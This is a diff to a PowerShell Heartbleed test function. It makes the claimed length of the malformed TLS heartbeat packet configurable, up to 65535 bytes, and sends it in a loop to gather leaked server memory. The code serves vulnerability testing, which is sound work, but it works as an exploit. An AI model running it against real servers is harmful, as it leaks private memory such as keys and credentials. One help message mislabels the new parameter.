@@ -30,6 +30,10 @@ attempts.
 For a single TLS connection, send this many heartbeat requests
 and gather the resulting data.  This defaults to 3 also.
 
+.PARAMETER HBLen
+
+The length of the malformed heartbeat packet.
+
 .PARAMETER NoRandomDelay
 
 Disable the random delay between heartbeat requests.  The random
@@ -104,6 +108,10 @@ function Test-Heartbleed
             [int]$Heartbeats=3,
 
         [Parameter(
+            HelpMessage="Number of heartbeats to send")]
+            [int]$HBLen=65535,
+
+        [Parameter(
             HelpMessage="TCP and read connection timeout")]
             [int]$Timeout=1000,
         
@@ -145,7 +153,15 @@ function Test-Heartbleed
         )
 
         # <3 <3 <3...       
-        $evil_heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0xff, 0xff )
+        # does not include HB length which is calculated.
+        $evil_heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01 )
+
+        # convert HB length to byte array in proper endian order
+        $n_hblen = [System.BitConverter]::GetBytes([uint16]$HBLen)
+        if ([System.BitConverter]::IsLittleEndian)
+        {
+            [Array]::Reverse($n_hblen)
+        }
     }
 
     Process
@@ -312,6 +328,7 @@ function Test-Heartbleed
                     for ($i=0; $i -lt $Heartbeats; $i++) 
                     {
                         $stream.Write($evil_heartbeat,0,$evil_heartbeat.Length)
+                        $stream.Write($n_hblen,0,$n_hblen.Length)
 
                         $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                         $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
